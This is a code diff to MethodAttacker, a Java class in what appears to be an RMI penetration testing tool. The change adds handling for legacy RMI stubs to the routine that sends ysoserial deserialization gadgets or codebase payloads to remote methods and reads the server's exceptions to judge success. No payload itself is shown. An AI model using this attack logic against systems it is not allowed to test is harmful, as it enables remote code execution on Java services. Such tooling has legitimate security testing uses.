@@ -27,7 +27,6 @@ public class MethodAttacker {
 
     private Field proxyField;
     private Field remoteField;
-    private Field parameterTypes;
 
     public MethodAttacker(RMIWhisperer rmiRegistry, HashMap<String,String> classes, MethodCandidate targetMethod)
     {
@@ -38,10 +37,8 @@ public class MethodAttacker {
         try {
             this.proxyField = Proxy.class.getDeclaredField("h");
             this.remoteField = RemoteObject.class.getDeclaredField("ref");
-            this.parameterTypes = Method.class.getDeclaredField("parameterTypes");
             proxyField.setAccessible(true);
             remoteField.setAccessible(true);
-            parameterTypes.setAccessible(true);
 
         } catch(NoSuchFieldException | SecurityException e) {
             Logger.eprintlnMixedYellow("Unexpected Exception caught during MethodAttacker instantiation:", e.getMessage());
@@ -51,7 +48,7 @@ public class MethodAttacker {
     }
 
     @SuppressWarnings({ "rawtypes", "deprecation" })
-    public void attack(Object gadget, String boundName, int argumentPosition, String mode)
+    public void attack(Object gadget, String boundName, int argumentPosition, String operationMode, int legacyMode)
     {
         Logger.printlnMixedYellow("Attacking", this.targetMethod.getSignature());
 
@@ -87,12 +84,27 @@ public class MethodAttacker {
 
             Logger.printlnMixedYellow("Found non primitive argument on position", String.valueOf(attackArgument));
 
+            boolean isLegacy = false;
+            if( (className.endsWith("_Stub") && legacyMode == 0) || legacyMode == 1) {
+                Logger.increaseIndent();
+                Logger.printlnMixedBlue("Class", className, "is treated as legacy stub.");
+                Logger.printlnMixedBlue("You can use", "--no-legacy", "to prevent this.");
+                Logger.decreaseIndent();
+                isLegacy = true;
+            }
+
             Remote instance = null;
             Class remoteClass = null;
             RemoteRef remoteRef = null;
 
             try {
-                remoteClass = RMGUtils.makeInterface(className, this.targetMethod);
+
+                if( !isLegacy )
+                    remoteClass = RMGUtils.makeInterface(className, this.targetMethod);
+
+                else
+                    remoteClass = RMGUtils.makeLegacyStub(className, this.targetMethod);
+
             } catch(CannotCompileException e) {
                 Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during interface creation.");
                 Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
@@ -103,10 +115,16 @@ public class MethodAttacker {
             try {
                 instance = rmi.getRegistry().lookup(name);
 
-                RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
-                remoteRef = ref.getRef();
+                if( !isLegacy ) {
+                    RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
+                    remoteRef = ref.getRef();
+
+                } else {
+                    remoteRef = (RemoteRef)remoteField.get(instance);
+                }
 
             } catch( Exception e ) {
+                e.printStackTrace();
                 Logger.eprintlnMixedYellow("Error: Unable to get instance for", name);
                 Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
                 Logger.decreaseIndent();
@@ -164,7 +182,7 @@ public class MethodAttacker {
                     Logger.printlnMixedBlue("Caught", "ClassNotFoundException", "during deserialization attack.");
                     String exceptionMessage = e.getMessage();
 
-                    if( mode.equals("ysoserial") ) {
+                    if( operationMode.equals("ysoserial") ) {
 
                         if( exceptionMessage.contains(randomInstance.getClass().getName())) {
                             Logger.printlnYellow("Deserialization attack most likely worked :)");
@@ -176,7 +194,7 @@ public class MethodAttacker {
                         }
                     }
 
-                    else if( mode.equals("codebase") ) {
+                    else if( operationMode.equals("codebase") ) {
 
                         if( exceptionMessage.contains("RMI class loader disabled") ) {
                             Logger.eprintlnYellow("Codebase attack failed.");
@@ -205,7 +223,7 @@ public class MethodAttacker {
                     }
 
                 } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
-                    Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), "during " + mode + " attack.");
+                    Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), "during " + operationMode + " attack.");
                     Logger.eprintln("This is usually caused by providing incompatible classes during codebase attacks.");
                     RMGUtils.stackTrace(e);
 
@@ -215,7 +233,7 @@ public class MethodAttacker {
                 }
 
             } catch( Exception e ) {
-                Logger.eprintlnYellow("Caught unexpected Exception during " + mode + " attack.");
+                Logger.eprintlnYellow("Caught unexpected Exception during " + operationMode + " attack.");
                 RMGUtils.stackTrace(e);
                 continue;
 
